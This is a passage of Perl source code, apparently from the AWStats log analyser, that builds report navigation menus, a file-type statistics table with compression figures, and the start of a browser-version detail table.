2,\n\t\t\t\t'lastlogins'     => 2,\n\t\t\t\t'emailsenders'   => 1,\n\t\t\t\t'allemails'      => 2,\n\t\t\t\t'lastemails'     => 2,\n\t\t\t\t'emailreceivers' => 1,\n\t\t\t\t'allemailr'      => 2,\n\t\t\t\t'lastemailr'     => 2,\n\t\t\t\t'robots'         => 1,\n\t\t\t\t'allrobots'      => 2,\n\t\t\t\t'lastrobots'     => 2,\n\t\t\t\t'worms'          => 1\n\t\t\t);\n\t\t\t%menutext = (\n\t\t\t\t'countries'      => $Message[148],\n\t\t\t\t'alldomains'     => $Message[80],\n\t\t\t\t'visitors'       => $Message[81],\n\t\t\t\t'allhosts'       => $Message[80],\n\t\t\t\t'lasthosts'      => $Message[9],\n\t\t\t\t'unknownip'      => $Message[45],\n\t\t\t\t'logins'         => $Message[94],\n\t\t\t\t'alllogins'      => $Message[80],\n\t\t\t\t'lastlogins'     => $Message[9],\n\t\t\t\t'emailsenders'   => $Message[131],\n\t\t\t\t'allemails'      => $Message[80],\n\t\t\t\t'lastemails'     => $Message[9],\n\t\t\t\t'emailreceivers' => $Message[132],\n\t\t\t\t'allemailr'      => $Message[80],\n\t\t\t\t'lastemailr'     => $Message[9],\n\t\t\t\t'robots'         => $Message[53],\n\t\t\t\t'allrobots'      => $Message[80],\n\t\t\t\t'lastrobots'     => $Message[9],\n\t\t\t\t'worms'          => $Message[136]\n\t\t\t);\n\t\t\tHTMLShowMenuCateg(\n\t\t\t\t'who',          $Message[92],\n\t\t\t\t'menu5.png',    $frame,\n\t\t\t\t$targetpage,    $linkanchor,\n\t\t\t\t$NewLinkParams, $NewLinkTarget,\n\t\t\t\t\\%menu,         \\%menulink,\n\t\t\t\t\\%menutext\n\t\t\t);\n\n\t\t\t# Navigation\n\t\t\t$linetitle = &AtLeastOneNotNull(\n\t\t\t\t$ShowSessionsStats,  $ShowPagesStats,\n\t\t\t\t$ShowFileTypesStats, $ShowFileSizesStats,\n\t\t\t\t$ShowOSStats,        $ShowBrowsersStats,\n\t\t\t\t$ShowScreenSizeStats, $ShowDownloadsStats\n\t\t\t);\n\t\t\tif ($linetitle) {\n\t\t\t\tprint \"<tr><td class=\\\"awsm\\\"\"\n\t\t\t\t  . ( $frame ? \"\" : \" valign=\\\"top\\\"\" ) . \">\"\n\t\t\t\t  . (\n\t\t\t\t\t$menuicon\n\t\t\t\t\t? \"<img src=\\\"$DirIcons/other/menu2.png\\\" />&nbsp;\"\n\t\t\t\t\t: \"\"\n\t\t\t\t  )\n\t\t\t\t  . \"<b>$Message[72]:</b></td>\\n\";\n\t\t\t}\n\t\t\tif ($linetitle) {\n\t\t\t\tprint( $frame? \"</tr>\\n\" : \"<td class=\\\"awsm\\\">\" );\n\t\t\t}\n\t\t\tif ($ShowSessionsStats) {\n\t\t\t\tprint( $frame? \"<tr><td class=\\\"awsm\\\">\" : \"\" );\n\t\t\t\tprint\n\"<a href=\\\"$linkanchor#sessions\\\"$targetpage>$Message[117]</a>\";\n\t\t\t\tprint( $frame? \"</td></tr>\\n\" : \" &nbsp; \" );\n\t\t\t}\n\t\t\tif ($ShowFileTypesStats && $LevelForFileTypesDetection > 0) {\n\t\t\t\tprint( $frame? \"<tr><td class=\\\"awsm\\\">\" : \"\" );\n\t\t\t\tprint\n\"<a href=\\\"$linkanchor#filetypes\\\"$targetpage>$Message[73]</a>\";\n\t\t\t\tprint( $frame? \"</td></tr>\\n\" : \" &nbsp; \" );\n\t\t\t}\n\t\t\tif ($ShowDownloadsStats && $LevelForFileTypesDetection > 0) {\n\t\t\t\tprint( $frame? \"<tr><td class=\\\"awsm\\\">\" : \"\" );\n\t\t\t\tprint\n\"<a href=\\\"$linkanchor#downloads\\\"$targetpage>$Message[178]</a>\";\n\t\t\t\tprint( $frame? \"</td></tr>\\n\" : \" &nbsp; \" );\n\t\t\t\tprint( $frame\n\t\t\t\t\t? \"<tr><td class=\\\"awsm\\\"> &nbsp; <img height=\\\"8\\\" width=\\\"9\\\" src=\\\"$DirIcons/other/page.png\\\" alt=\\\"...\\\" /> \"\n\t\t\t\t\t: \"\"\n\t\t\t\t);\n\t\t\t\tprint \"<a href=\\\"\"\n\t\t\t\t  . (\n\t\t\t\t\t$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks\n\t\t\t\t\t? XMLEncode(\n\t\t\t\t\t\t\"$AWScript${NewLinkParams}output=downloads\")\n\t\t\t\t\t: \"$StaticLinks.downloads.$StaticExt\"\n\t\t\t\t  )\n\t\t\t\t  . \"\\\"$NewLinkTarget>$Message[80]</a>\\n\";\n\t\t\t\tprint( $frame? \"</td></tr>\\n\" : \" &nbsp; \" );\n\t\t\t}\n\t\t\tif ($ShowPagesStats) {\n\t\t\t\tprint( $frame? \"<tr><td class=\\\"awsm\\\">\" : \"\" );\n\t\t\t\tprint\n\"<a href=\\\"$linkanchor#urls\\\"$targetpage>$Message[29]</a>\\n\";\n\t\t\t\tprint( $frame? \"</td></tr>\\n\" : \" &nbsp; \" );\n\t\t\t}\n\t\t\tif ($ShowPagesStats) {\n\t\t\t\tprint( $frame\n\t\t\t\t\t? \"<tr><td class=\\\"awsm\\\"> &nbsp; <img height=\\\"8\\\" width=\\\"9\\\" src=\\\"$DirIcons/other/page.png\\\" alt=\\\"...\\\" /> \"\n\t\t\t\t\t: \"\"\n\t\t\t\t);\n\t\t\t\tprint \"<a href=\\\"\"\n\t\t\t\t  . (\n\t\t\t\t\t$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks\n\t\t\t\t\t? XMLEncode(\n\t\t\t\t\t\t\"$AWScript${NewLinkParams}output=urldetail\")\n\t\t\t\t\t: \"$StaticLinks.urldetail.$StaticExt\"\n\t\t\t\t  )\n\t\t\t\t  . \"\\\"$NewLinkTarget>$Message[80]</a>\\n\";\n\t\t\t\tprint( $frame? \"</td></tr>\\n\" : \" &nbsp; \" );\n\t\t\t}\n\t\t\tif ( $ShowPagesStats =~ /E/i ) {\n\t\t\t\tprint( $frame\n\t\t\t\t\t? \"<tr><td class=\\\"awsm\\\"> &nbsp; <img height=\\\"8\\\" width=\\\"9\\\" src=\\\"$DirIcons/other/page.png\\\" alt=\\\"...\\\" /> \"\n\t\t\t\t\t: \"\"\n\t\t\t\t);\n\t\t\t\tprint \"<a href=\\\"\"\n\t\t\t\t  . (\n\t\t\t\t\t$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks\n\t\t\t\t\t? XMLEncode(\n\t\t\t\t\t\t\"$AWScript${NewLinkParams}output=urlentry\")\n\t\t\t\t\t: \"$StaticLinks.urlentry.$StaticExt\"\n\t\t\t\t  )\n\t\t\t\t  . \"\\\"$NewLinkTarget>$Message[104]</a>\\n\";\n\t\t\t\tprint( $frame? \"</td></tr>\\n\" : \" &nbsp; \" );\n\t\t\t}\n\t\t\tif ( $ShowPagesStats =~ /X/i ) {\n\t\t\t\tprint( $frame\n\t\t\t\t\t? \"<tr><td class=\\\"awsm\\\"> &nbsp; <img height=\\\"8\\\" width=\\\"9\\\" src=\\\"$DirIcons/other/page.png\\\" alt=\\\"...\\\" /> \"\n\t\t\t\t\t: \"\"\n\t\t\t\t);\n\t\t\t\tprint \"<a href=\\\"\"\n\t\t\t\t  . (\n\t\t\t\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t\t\t\t  || !$StaticLinks\n\t\t\t\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=urlexit\")\n\t\t\t\t\t: \"$StaticLinks.urlexit.$StaticExt\"\n\t\t\t\t  )\n\t\t\t\t  . \"\\\"$NewLinkTarget>$Message[116]</a>\\n\";\n\t\t\t\tprint( $frame? \"</td></tr>\\n\" : \" &nbsp; \" );\n\t\t\t}\n\t\t\tif ($ShowOSStats) {\n\t\t\t\tprint( $frame? \"<tr><td class=\\\"awsm\\\">\" : \"\" );\n\t\t\t\tprint\n\t\t\t\t  \"<a href=\\\"$linkanchor#os\\\"$targetpage>$Message[59]</a>\";\n\t\t\t\tprint( $frame? \"</td></tr>\\n\" : \" &nbsp; \" );\n\t\t\t}\n\t\t\tif ($ShowOSStats) {\n\t\t\t\tprint( $frame\n\t\t\t\t\t? \"<tr><td class=\\\"awsm\\\"> &nbsp; <img height=\\\"8\\\" width=\\\"9\\\" src=\\\"$DirIcons/other/page.png\\\" alt=\\\"...\\\" /> \"\n\t\t\t\t\t: \"\"\n\t\t\t\t);\n\t\t\t\tprint \"<a href=\\\"\"\n\t\t\t\t  . (\n\t\t\t\t\t$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks\n\t\t\t\t\t? XMLEncode(\n\t\t\t\t\t\t\"$AWScript${NewLinkParams}output=osdetail\")\n\t\t\t\t\t: \"$StaticLinks.osdetail.$StaticExt\"\n\t\t\t\t  )\n\t\t\t\t  . \"\\\"$NewLinkTarget>$Message[58]</a>\\n\";\n\t\t\t\tprint( $frame? \"</td></tr>\\n\" : \" &nbsp; \" );\n\t\t\t}\n\t\t\tif ($ShowOSStats) {\n\t\t\t\tprint( $frame\n\t\t\t\t\t? \"<tr><td class=\\\"awsm\\\"> &nbsp; <img height=\\\"8\\\" width=\\\"9\\\" src=\\\"$DirIcons/other/page.png\\\" alt=\\\"...\\\" /> \"\n\t\t\t\t\t: \"\"\n\t\t\t\t);\n\t\t\t\tprint \"<a href=\\\"\"\n\t\t\t\t  . (\n\t\t\t\t\t$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks\n\t\t\t\t\t? XMLEncode(\n\t\t\t\t\t\t\"$AWScript${NewLinkParams}output=unknownos\")\n\t\t\t\t\t: \"$StaticLinks.unknownos.$StaticExt\"\n\t\t\t\t  )\n\t\t\t\t  . \"\\\"$NewLinkTarget>$Message[0]</a>\\n\";\n\t\t\t\tprint( $frame? \"</td></tr>\\n\" : \" &nbsp; \" );\n\t\t\t}\n\t\t\tif ($ShowBrowsersStats) {\n\t\t\t\tprint( $frame? \"<tr><td class=\\\"awsm\\\">\" : \"\" );\n\t\t\t\tprint\n\"<a href=\\\"$linkanchor#browsers\\\"$targetpage>$Message[21]</a>\";\n\t\t\t\tprint( $frame? \"</td></tr>\\n\" : \" &nbsp; \" );\n\t\t\t}\n\t\t\tif ($ShowBrowsersStats) {\n\t\t\t\tprint( $frame\n\t\t\t\t\t? \"<tr><td class=\\\"awsm\\\"> &nbsp; <img height=\\\"8\\\" width=\\\"9\\\" src=\\\"$DirIcons/other/page.png\\\" alt=\\\"...\\\" /> \"\n\t\t\t\t\t: \"\"\n\t\t\t\t);\n\t\t\t\tprint \"<a href=\\\"\"\n\t\t\t\t  . (\n\t\t\t\t\t$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks\n\t\t\t\t\t? XMLEncode(\n\t\t\t\t\t\t\"$AWScript${NewLinkParams}output=browserdetail\")\n\t\t\t\t\t: \"$StaticLinks.browserdetail.$StaticExt\"\n\t\t\t\t  )\n\t\t\t\t  . \"\\\"$NewLinkTarget>$Message[58]</a>\\n\";\n\t\t\t\tprint( $frame? \"</td></tr>\\n\" : \" &nbsp; \" );\n\t\t\t}\n\t\t\tif ($ShowBrowsersStats) {\n\t\t\t\tprint( $frame\n\t\t\t\t\t? \"<tr><td class=\\\"awsm\\\"> &nbsp; <img height=\\\"8\\\" width=\\\"9\\\" src=\\\"$DirIcons/other/page.png\\\" alt=\\\"...\\\" /> \"\n\t\t\t\t\t: \"\"\n\t\t\t\t);\n\t\t\t\tprint \"<a href=\\\"\"\n\t\t\t\t  . (\n\t\t\t\t\t$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks\n\t\t\t\t\t? XMLEncode(\n\t\t\t\t\t\t\"$AWScript${NewLinkParams}output=unknownbrowser\")\n\t\t\t\t\t: \"$StaticLinks.unknownbrowser.$StaticExt\"\n\t\t\t\t  )\n\t\t\t\t  . \"\\\"$NewLinkTarget>$Message[0]</a>\\n\";\n\t\t\t\tprint( $frame? \"</td></tr>\\n\" : \" &nbsp; \" );\n\t\t\t}\n\t\t\tif ($ShowScreenSizeStats) {\n\t\t\t\tprint( $frame? \"<tr><td class=\\\"awsm\\\">\" : \"\" );\n\t\t\t\tprint\n\"<a href=\\\"$linkanchor#screensizes\\\"$targetpage>$Message[135]</a>\";\n\t\t\t\tprint( $frame? \"</td></tr>\\n\" : \" &nbsp; \" );\n\t\t\t}\n\t\t\tif ($linetitle) { print( $frame? \"\" : \"</td></tr>\\n\" ); }\n\n\t\t\t# Referers\n\t\t\t%menu = (\n\t\t\t\t'referer'      => $ShowOriginStats ? 1 : 0,\n\t\t\t\t'refererse'    => $ShowOriginStats ? 2 : 0,\n\t\t\t\t'refererpages' => $ShowOriginStats ? 3 : 0,\n\t\t\t\t'keys' => ( $ShowKeyphrasesStats || $ShowKeywordsStats )\n\t\t\t\t? 4\n\t\t\t\t: 0,\n\t\t\t\t'keyphrases' => $ShowKeyphrasesStats ? 5 : 0,\n\t\t\t\t'keywords'   => $ShowKeywordsStats   ? 6 : 0\n\t\t\t);\n\t\t\t%menulink = (\n\t\t\t\t'referer'      => 1,\n\t\t\t\t'refererse'    => 2,\n\t\t\t\t'refererpages' => 2,\n\t\t\t\t'keys'         => 1,\n\t\t\t\t'keyphrases'   => 2,\n\t\t\t\t'keywords'     => 2\n\t\t\t);\n\t\t\t%menutext = (\n\t\t\t\t'referer'      => $Message[37],\n\t\t\t\t'refererse'    => $Message[126],\n\t\t\t\t'refererpages' => $Message[127],\n\t\t\t\t'keys'         => $Message[14],\n\t\t\t\t'keyphrases'   => $Message[120],\n\t\t\t\t'keywords'     => $Message[121]\n\t\t\t);\n\t\t\tHTMLShowMenuCateg(\n\t\t\t\t'referers',     $Message[23],\n\t\t\t\t'menu7.png',    $frame,\n\t\t\t\t$targetpage,    $linkanchor,\n\t\t\t\t$NewLinkParams, $NewLinkTarget,\n\t\t\t\t\\%menu,         \\%menulink,\n\t\t\t\t\\%menutext\n\t\t\t);\n\n\t\t\t# Others\n\t\t\t%menu = (\n\t\t\t\t'filetypes' => ( $ShowFileTypesStats =~ /C/i ) ? 1 : 0,\n\t\t\t\t'misc' => $ShowMiscStats ? 2 : 0,\n\t\t\t\t'errors' => ( $ShowHTTPErrorsStats || $ShowSMTPErrorsStats )\n\t\t\t\t? 3\n\t\t\t\t: 0,\n\t\t\t\t'clusters' => $ShowClusterStats ? 5 : 0\n\t\t\t);\n\t\t\t%menulink = (\n\t\t\t\t'filetypes' => 1,\n\t\t\t\t'misc'      => 1,\n\t\t\t\t'errors'    => 1,\n\t\t\t\t'clusters'  => 1\n\t\t\t);\n\t\t\t%menutext = (\n\t\t\t\t'filetypes' => $Message[98],\n\t\t\t\t'misc'      => $Message[139],\n\t\t\t\t'errors'    =>\n\t\t\t\t  ( $ShowSMTPErrorsStats ? $Message[147] : $Message[32] ),\n\t\t\t\t'clusters' => $Message[155]\n\t\t\t);\n\t\t\tmy $idx = 0;\n\t\t\tforeach ( sort keys %TrapInfosForHTTPErrorCodes ) {\n\t\t\t\t$menu{\"errors$_\"}     = $ShowHTTPErrorsStats ? 4+$idx : 0;\n\t\t\t\t$menulink{\"errors$_\"} = 2;\n\t\t\t\t$menutext{\"errors$_\"} = $Message[49] . ' (' . $_ . ')';\n\t\t\t\t$idx++;\n\t\t\t}\n\t\t\tHTMLShowMenuCateg(\n\t\t\t\t'others',       $Message[2],\n\t\t\t\t'menu8.png',    $frame,\n\t\t\t\t$targetpage,    $linkanchor,\n\t\t\t\t$NewLinkParams, $NewLinkTarget,\n\t\t\t\t\\%menu,         \\%menulink,\n\t\t\t\t\\%menutext\n\t\t\t);\n\n\t\t\t# Extra/Marketing\n\t\t\t%menu     = ();\n\t\t\t%menulink = ();\n\t\t\t%menutext = ();\n\t\t\tmy $i = 1;\n\t\t\tforeach ( 1 .. @ExtraName - 1 ) {\n\t\t\t\t$menu{\"extra$_\"}        = $i++;\n\t\t\t\t$menulink{\"extra$_\"}    = 1;\n\t\t\t\t$menutext{\"extra$_\"}    = $ExtraName[$_];\n\t\t\t\t$menu{\"allextra$_\"}     = $i++;\n\t\t\t\t$menulink{\"allextra$_\"} = 2;\n\t\t\t\t$menutext{\"allextra$_\"} = $Message[80];\n\t\t\t}\n\t\t\tHTMLShowMenuCateg(\n\t\t\t\t'extra',        $Message[134],\n\t\t\t\t'',             $frame,\n\t\t\t\t$targetpage,    $linkanchor,\n\t\t\t\t$NewLinkParams, $NewLinkTarget,\n\t\t\t\t\\%menu,         \\%menulink,\n\t\t\t\t\\%menutext\n\t\t\t);\n\t\t\tprint \"</table>\\n\";\n\t\t}\n\t\telse {\n\n\t\t\t# Menu Applet\n\t\t\tif ($frame) { }\n\t\t\telse { }\n\t\t}\n\n\t\t#print ($frame?\"\":\"<br />\\n\");\n\t\tprint \"<br />\\n\";\n\t}\n\n\t# Print Back link\n\telsif ( !$HTMLOutput{'main'} ) {\n\t\tprint \"<table>\\n\";\n\t\t$NewLinkParams =~ s/(^|&|&amp;)hostfilter=[^&]*//i;\n\t\t$NewLinkParams =~ s/(^|&|&amp;)urlfilter=[^&]*//i;\n\t\t$NewLinkParams =~ s/(^|&|&amp;)refererpagesfilter=[^&]*//i;\n\t\t$NewLinkParams =~ s/(&amp;|&)+/&amp;/i;\n\t\t$NewLinkParams =~ s/^&amp;//;\n\t\t$NewLinkParams =~ s/&amp;$//;\n\t\tif (   !$DetailedReportsOnNewWindows\n\t\t\t|| $FrameName eq 'mainright'\n\t\t\t|| $QueryString =~ /buildpdf/i )\n\t\t{\n\t\t\tprint \"<tr><td class=\\\"aws\\\"><a href=\\\"\"\n\t\t\t  . (\n\t\t\t\t$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks\n\t\t\t\t? XMLEncode(\"$AWScript${NewLinkParams}\")\n\t\t\t\t: \"$StaticLinks.$StaticExt\"\n\t\t\t  )\n\t\t\t  . \"\\\">$Message[76]</a></td></tr>\\n\";\n\t\t}\n\t\telse {\n\t\t\tprint\n\"<tr><td class=\\\"aws\\\"><a href=\\\"javascript:parent.window.close();\\\">$Message[118]</a></td></tr>\\n\";\n\t\t}\n\t\tprint \"</table>\\n\";\n\t\tprint \"\\n\";\n\t}\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the File Type table\n# Parameters:   _\n# Input:        $NewLinkParams, $NewLinkTargets\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainFileType{\n    my $NewLinkParams = shift;\n    my $NewLinkTarget = shift;\n\tif (!$LevelForFileTypesDetection > 0){return;}\n\tif ($Debug) { debug( \"ShowFileTypesStatsCompressionStats\", 2 ); }\n\tprint \"$Center<a name=\\\"filetypes\\\">&nbsp;</a><br />\\n\";\n\tmy $Totalh = 0;\n\tforeach ( keys %_filetypes_h ) { $Totalh += $_filetypes_h{$_}; }\n\tmy $Totalk = 0;\n\tforeach ( keys %_filetypes_k ) { $Totalk += $_filetypes_k{$_}; }\n\tmy $title = \"$Message[73]\";\n    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {\n        # extend the title to include the added link \n        $title = \"$title &nbsp; - &nbsp; <a href=\\\"\" . (XMLEncode(\n           \"$AddLinkToExternalCGIWrapper\" . \"?section=FILETYPES&baseName=$DirData/$PROG\"\n           . \"&month=$MonthRequired&year=$YearRequired&day=$DayRequired\"\n           . \"&siteConfig=$SiteConfig\" )\n           . \"\\\"$NewLinkTarget>$Message[179]</a>\");\n    } \n\n\tif ( $ShowFileTypesStats =~ /C/i ) { $title .= \" - $Message[98]\"; }\n\t\n\t# build keylist at top\n\t&BuildKeyList( $MaxRowsInHTMLOutput, 1, \\%_filetypes_h,\n\t\t\\%_filetypes_h );\n\t\t\n\t&tab_head( \"$title\", 19, 0, 'filetypes' );\n\t\t\n\t# Graph the top five in a pie chart\n\tif (scalar @keylist > 1){\n\t\tforeach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )\n\t\t{\n\t\t\tmy @blocklabel = ();\n\t\t\tmy @valdata = ();\n\t\t\tmy @valcolor = ($color_p);\n\t\t\tmy $cnt = 0;\n\t\t\tforeach my $key (@keylist) {\n\t\t\t\tpush @valdata, int( $_filetypes_h{$key} / $Totalh * 1000 ) / 10;\n\t\t\t\tpush @blocklabel, \"$key\";\n\t\t\t\t$cnt++;\n\t\t\t\tif ($cnt > 4) { last; }\n\t\t\t}\n\t\t\tprint \"<tr><td colspan=\\\"7\\\">\";\n\t\t\tmy $function = \"ShowGraph_$pluginname\";\n\t\t\t&$function(\n\t\t\t\t\"$Message[73]\",              \"filetypes\",\n\t\t\t\t0, \t\t\t\t\t\t\\@blocklabel,\n\t\t\t\t0,           \t\t\t\\@valcolor,\n\t\t\t\t0,              \t\t0,\n\t\t\t\t0,          \t\t\t\\@valdata\n\t\t\t);\n\t\t\tprint \"</td></tr>\";\n\t\t}\n\t}\n\t\n\tprint\n\"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th colspan=\\\"3\\\">$Message[73]</th>\";\n\n\tif ( $ShowFileTypesStats =~ /H/i ) {\n\t\tprint \"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\"\"\n\t\t  . Tooltip(4)\n\t\t  . \">$Message[57]</th><th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[15]</th>\";\n\t}\n\tif ( $ShowFileTypesStats =~ /B/i ) {\n\t\tprint \"<th bgcolor=\\\"#$color_k\\\" width=\\\"80\\\"\"\n\t\t  . Tooltip(5)\n\t\t  . \">$Message[75]</th><th bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[15]</th>\";\n\t}\n\tif ( $ShowFileTypesStats =~ /C/i ) {\n\t\tprint\n\"<th bgcolor=\\\"#$color_k\\\" width=\\\"100\\\">$Message[100]</th><th bgcolor=\\\"#$color_k\\\" width=\\\"100\\\">$Message[101]</th><th bgcolor=\\\"#$color_k\\\" width=\\\"100\\\">$Message[99]</th>\";\n\t}\n\tprint \"</tr>\\n\";\n\tmy $total_con = 0;\n\tmy $total_cre = 0;\n\tmy $count     = 0;\n\tforeach my $key (@keylist) {\n\t\tmy $p_h = '&nbsp;';\n\t\tmy $p_k = '&nbsp;';\n\t\tif ($Totalh) {\n\t\t\t$p_h = int( $_filetypes_h{$key} / $Totalh * 1000 ) / 10;\n\t\t\t$p_h = \"$p_h %\";\n\t\t}\n\t\tif ($Totalk) {\n\t\t\t$p_k = int( $_filetypes_k{$key} / $Totalk * 1000 ) / 10;\n\t\t\t$p_k = \"$p_k %\";\n\t\t}\n\t\tif ( $key eq 'Unknown' ) {\n\t\t\tprint \"<tr><td\"\n\t\t\t  . ( $count ? \"\" : \" width=\\\"$WIDTHCOLICON\\\"\" )\n\t\t\t  . \"><img src=\\\"$DirIcons\\/mime\\/unknown.png\\\"\"\n\t\t\t  . AltTitle(\"\")\n\t\t\t  . \" /></td><td class=\\\"aws\\\" colspan=\\\"2\\\"><span style=\\\"color: #$color_other\\\">$Message[0]</span></td>\";\n\t\t}\n\t\telse {\n\t\t\tmy $nameicon = $MimeHashLib{$key}[0] || \"notavailable\";\n\t\t\tmy $nametype = $MimeHashFamily{$MimeHashLib{$key}[0]} || \"&nbsp;\";\n\t\t\tprint \"<tr><td\"\n\t\t\t  . ( $count ? \"\" : \" width=\\\"$WIDTHCOLICON\\\"\" )\n\t\t\t  . \"><img src=\\\"$DirIcons\\/mime\\/$nameicon.png\\\"\"\n\t\t\t  . AltTitle(\"\")\n\t\t\t  . \" /></td><td class=\\\"aws\\\">$key</td>\";\n\t\t\tprint \"<td class=\\\"aws\\\">$nametype</td>\";\n\t\t}\n\t\tif ( $ShowFileTypesStats =~ /H/i ) {\n\t\t\tprint \"<td>\".Format_Number($_filetypes_h{$key}).\"</td><td>$p_h</td>\";\n\t\t}\n\t\tif ( $ShowFileTypesStats =~ /B/i ) {\n\t\t\tprint '<td nowrap=\"nowrap\">'\n\t\t\t  . Format_Bytes( $_filetypes_k{$key} )\n\t\t\t  . \"</td><td>$p_k</td>\";\n\t\t}\n\t\tif ( $ShowFileTypesStats =~ /C/i ) {\n\t\t\tif ( $_filetypes_gz_in{$key} ) {\n\t\t\t\tmy $percent = int(\n\t\t\t\t\t100 * (\n\t\t\t\t\t\t1 - $_filetypes_gz_out{$key} /\n\t\t\t\t\t\t  $_filetypes_gz_in{$key}\n\t\t\t\t\t)\n\t\t\t\t);\n\t\t\t\tprintf(\n\t\t\t\t\t\"<td>%s</td><td>%s</td><td>%s (%s%)</td>\",\n\t\t\t\t\tFormat_Bytes( $_filetypes_gz_in{$key} ),\n\t\t\t\t\tFormat_Bytes( $_filetypes_gz_out{$key} ),\n\t\t\t\t\tFormat_Bytes(\n\t\t\t\t\t\t$_filetypes_gz_in{$key} -\n\t\t\t\t\t\t  $_filetypes_gz_out{$key}\n\t\t\t\t\t),\n\t\t\t\t\t$percent\n\t\t\t\t);\n\t\t\t\t$total_con += $_filetypes_gz_in{$key};\n\t\t\t\t$total_cre += $_filetypes_gz_out{$key};\n\t\t\t}\n\t\t\telse {\n\t\t\t\tprint \"<td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td>\";\n\t\t\t}\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t\t$count++;\n\t}\n\n\t# Add total (only useful if compression is enabled)\n\tif ( $ShowFileTypesStats =~ /C/i ) {\n\t\tmy $colspan = 3;\n\t\tif ( $ShowFileTypesStats =~ /H/i ) { $colspan += 2; }\n\t\tif ( $ShowFileTypesStats =~ /B/i ) { $colspan += 2; }\n\t\tprint \"<tr>\";\n\t\tprint\n\"<td class=\\\"aws\\\" colspan=\\\"$colspan\\\"><b>$Message[98]</b></td>\";\n\t\tif ( $ShowFileTypesStats =~ /C/i ) {\n\t\t\tif ($total_con) {\n\t\t\t\tmy $percent =\n\t\t\t\t  int( 100 * ( 1 - $total_cre / $total_con ) );\n\t\t\t\tprintf(\n\t\t\t\t\t\"<td>%s</td><td>%s</td><td>%s (%s%)</td>\",\n\t\t\t\t\tFormat_Bytes($total_con),\n\t\t\t\t\tFormat_Bytes($total_cre),\n\t\t\t\t\tFormat_Bytes( $total_con - $total_cre ),\n\t\t\t\t\t$percent\n\t\t\t\t);\n\t\t\t}\n\t\t\telse {\n\t\t\t\tprint \"<td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td>\";\n\t\t\t}\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end();\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Browser Detail frame or static page\n# Parameters:   _\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLShowBrowserDetail{\n\t# Show browsers versions\n\tprint \"$Center<a name=\\\"browsersversions\\\">&nbsp;</a><br />\";\n\tmy $title = \"$Message[21]\";\n\t&tab_head( \"$title\", 19, 0, 'browsersversions' );\n\tprint\n\"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th colspan=\\\"2\\\">$Message[58]</th>\";\n\tprint\n\"<th width=\\\"80\\\">$Message[111]</th><th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[56]</th><th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[15]</th>\";\n\tprint\n\"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th><th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[15]</th>\";\n\tprint \"<th>&nbsp;</th>\";\n\tprint \"</tr>\\n\";\n\tmy $total_h = 0;\n\tmy $total_p = 0;\n\tmy $count = 0;\n\t&BuildKeyList( MinimumButNoZero( scalar keys %_browser_h, 500 ),\n\t\t1, \\%_browser_h, \\%_browser_p );\n\tmy %keysinkeylist = ();\n\tmy $max_h = 1;\n\tmy $max_p = 1;\n\n\t# Count total by family\n\tmy %totalfamily_h = ();\n\tmy %totalfamily_p = ();\n\tmy $TotalFamily_h = 0;\n\tmy $TotalFamily_p = 0;\n  BROWSERLOOP: foreach my $key (@keylist) {\n\t\t$total_h += $_browser_h{$key};\n\t\tif ( $_browser_h{$key} > $max_h ) {\n\t\t\t$max_h = $_browser_h{$key};\n\t\t}\n\t\t$total_p += $_browser_p{$key};\n\t\tif ( $_browser_p{$key} > $max_p ) {\n\t\t\t$max_p = $_browser_p{$key};\n\t\t}\n\t\tforeach my $family ( keys %BrowsersFamily ) {\n\t\t\tif ( $key =~ /^$family/i ) {\n\t\t\t\t$totalfamily_h{$family} += $_browser_h{$key};\n\t\t\t\t$totalfamily_p{$family} += $_browser_p{$key};\n\t\t\t\t$TotalFamily_h          += $_browser_h{$key};\n\t\t\t\t$TotalFamily_p          += $_browser_p{$key};\n\t\t\t\tnext BROWSERLOOP;\n\t\t\t}\n\t\t}\n\t}\n\n\t# Write records grouped in a browser family\n\tforeach my $family (\n\t\tsort { $BrowsersFamily{$a} <=> $BrowsersFamily{$b} }\n\t\tkeys %BrowsersFamily\n\t  )\n\t{\n\t\tmy $p_h = '&nbsp;';\n\t\tmy $p_p = '&nbsp;';\n\t\tif ($total_h) {\n\t\t\t$p_h = int( $totalfamily_h{$family} / $total_h * 1000 ) / 10;\n\t\t\t$p_h = \"$p_h %\";\n\t\t}\n\t\tif ($total_p) {\n\t\t\t$p_p = int( $totalfamily_p{$family} / $total_p * 1000 ) / 10;\n\t\t\t$p_p = \"$p_p %\";\n\t\t}\n\t\tmy $familyheadershown = 0;\n\n\t\t#foreach my $key ( reverse sort keys %_browser_h ) {\n\t\tforeach my $key ( reverse sort SortBrowsers keys %_browser_h ) {\n\t\t\tif ( $key =~ /^$family(.*)/i ) {\n\t\t\t\tif ( !$familyheadershown ) {\n\t\t\t\t\tprint\n\"<tr bgcolor=\\\"#F6F6F6\\\"><td class=\\\"aws\\\" 